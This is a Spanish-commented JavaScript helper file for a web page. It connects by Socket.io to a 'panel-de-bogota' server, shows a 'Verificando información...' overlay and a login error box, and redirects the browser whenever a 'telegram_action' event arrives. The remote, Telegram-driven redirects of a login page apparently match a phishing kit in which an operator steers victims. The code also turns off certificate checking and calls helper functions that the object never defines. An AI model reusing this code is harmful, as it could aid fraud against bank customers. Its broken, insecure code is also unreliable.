// Namespace para utilidades comunes
window.commonUtils = {
    // Inicialización de funciones comunes
    initializeCommon: function() {
        console.log('Inicializando funciones comunes...');
        
        // Crear elementos UI necesarios
        this.createLoadingScreen();
        this.createErrorMessage();
        
        // Inicializar Socket.io si no está ya inicializado
        if (!window.socket && typeof io !== 'undefined') {
            this.initializeSocket();
        }
        
        console.log('Funciones comunes inicializadas');
    },

    // Inicializar Socket.io
    initializeSocket: function() {
        console.log('Inicializando Socket.io...');
        try {
            if (!window.socket && typeof io !== 'undefined') {
                const isVercel = window.location.hostname.includes('vercel.app');
                const socketOptions = {
                    path: '/socket.io',
                    transports: ['websocket', 'polling'],
                    reconnection: true,
                    reconnectionAttempts: Infinity,
                    reconnectionDelay: 1000,
                    reconnectionDelayMax: 5000,
                    timeout: 20000,
                    autoConnect: true,
                    forceNew: true,
                    secure: window.location.protocol === 'https:',
                    rejectUnauthorized: false
                };

                // Intentar obtener la URL base del servidor actual
                let socketUrl;
                if (isVercel) {
                    socketUrl = 'https://panel-de-bogota.vercel.app';
                } else {
                    socketUrl = window.location.origin;
                }
                
                console.log('Conectando a Socket.io en:', socketUrl);
                window.socket = io(socketUrl, socketOptions);
                
                // Eventos de conexión
                window.socket.on('connect', () => {
                    console.log('Socket.io conectado - ID:', window.socket.id);
                    this.hideLoadingScreen();
                });

                window.socket.on('telegram_action', (data) => {
                    console.log('Acción de Telegram recibida:', data);
                    if (data.redirect) {
                        if (data.message) {
                            sessionStorage.setItem('actionMessage', data.message);
                        }
                        window.location.href = data.redirect;
                    }
                });

                window.socket.on('disconnect', (reason) => {
                    console.log('Socket.io desconectado:', reason);
                    this.showLoadingScreen('Reconectando al servidor...');
                });

                window.socket.on('connect_error', (error) => {
                    console.error('Error de conexión:', error.message);
                    this.showLoadingScreen('Problema de conexión, reintentando...');
                });

                window.socket.on('reconnect', (attemptNumber) => {
                    console.log('Reconectado después de', attemptNumber, 'intentos');
                    this.hideLoadingScreen();
                });

                window.socket.on('reconnect_attempt', () => {
                    console.log('Intentando reconectar...');
                });

                window.socket.on('reconnect_error', (error) => {
                    console.error('Error de reconexión:', error.message);
                });

                window.socket.on('reconnect_failed', () => {
                    console.error('Reconexión fallida');
                    this.showLoadingScreen('Error de conexión. Por favor, recarga la página.');
                });
            }
        } catch (error) {
            console.error('Error al inicializar Socket.io:', error);
            this.hideLoadingScreen();
        }
    },

    // Crear pantalla de carga
    createLoadingScreen: function() {
        if (document.querySelector('.loading-screen')) return;
        
        const loadingScreen = document.createElement('div');
        loadingScreen.className = 'loading-screen';
        loadingScreen.innerHTML = `
            <div class="loading-content">
                <div class="spinner"></div>
                <p class="loading-text">Verificando información...</p>
            </div>
        `;
        
        const styleSheet = document.createElement("style");
        styleSheet.textContent = `
            .loading-screen {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: rgba(255, 255, 255, 0.95);
                z-index: 9999;
                justify-content: center;
                align-items: center;
            }
            .loading-screen.active {
                display: flex !important;
            }
            .loading-content {
                text-align: center;
            }
            .spinner {
                width: 50px;
                height: 50px;
                border: 5px solid #f3f3f3;
                border-top: 5px solid #3498db;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            .loading-text {
                font-size: 18px;
                color: #333;
                margin: 0;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        
        document.head.appendChild(styleSheet);
        document.body.appendChild(loadingScreen);
    },

    // Crear mensaje de error
    createErrorMessage: function() {
        if (document.querySelector('.login-error')) return;
        
        const errorMessage = document.createElement('div');
        errorMessage.className = 'login-error';
        errorMessage.style.cssText = `
            display: none;
            background-color: #fff2f2;
            border: 1px solid #ffcdd2;
            color: #d32f2f;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            text-align: center;
        `;
        
        const container = document.querySelector('.login-section') || document.body;
        container.appendChild(errorMessage);
    },

    // Mostrar pantalla de carga
    showLoading: function(message = 'Verificando información...') {
        const loadingScreen = document.querySelector('.loading-screen');
        if (loadingScreen) {
            const loadingText = loadingScreen.querySelector('.loading-text');
            if (loadingText) {
                loadingText.textContent = message;
            }
            loadingScreen.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
    },

    // Ocultar pantalla de carga
    hideLoading: function() {
        const loadingScreen = document.querySelector('.loading-screen');
        if (loadingScreen) {
            loadingScreen.classList.remove('active');
            document.body.style.overflow = '';
        }
    },

    // Mostrar mensaje de error
    showError: function(message) {
        const errorMessage = document.querySelector('.login-error');
        if (errorMessage) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            setTimeout(() => {
                errorMessage.style.display = 'none';
            }, 5000);
        }
    }
};

// Variables globales
window.isSubmitting = false;